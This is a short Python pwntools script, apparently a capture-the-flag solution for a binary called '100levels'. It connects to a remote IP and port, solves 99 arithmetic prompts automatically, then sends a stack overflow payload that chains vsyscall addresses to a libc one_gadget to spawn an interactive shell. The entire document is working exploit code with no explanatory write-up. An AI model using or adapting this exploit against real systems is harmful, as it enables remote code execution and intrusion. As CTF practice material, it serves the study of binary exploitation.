#coding:utf8  
from pwn import *  
  
#sh = process('./100levels')  
sh = remote("111.200.241.244",55687)
libc = ELF('./libc.so')  
  
vsyscall = 0xffffffffff600000  
  
system_addr = libc.sym['system']  
execv_gadget = 0x4526a  
offset_addr = execv_gadget - system_addr  
  
#先执行2，让system的地址存储到栈里  
sh.sendlineafter('Choice:\n','2')  
  
sh.sendlineafter('Choice:\n','1')  
  
sh.sendlineafter('How many levels?\n','0')  
  
sh.sendafter('Any more?\n',str(offset_addr))  
  
for i in range(0,99):  
   sh.recvuntil('Question: ')  
   a = int(sh.recvuntil(' '))  
   sh.recvuntil('* ')  
   b = int(sh.recvuntil(' '))  
   sh.sendlineafter('Answer:',str(a*b))  
  
payload = 'a'*0x38 + p64(vsyscall)*3  
  
sh.sendafter('Answer:',payload)  
  
sh.interactive() 
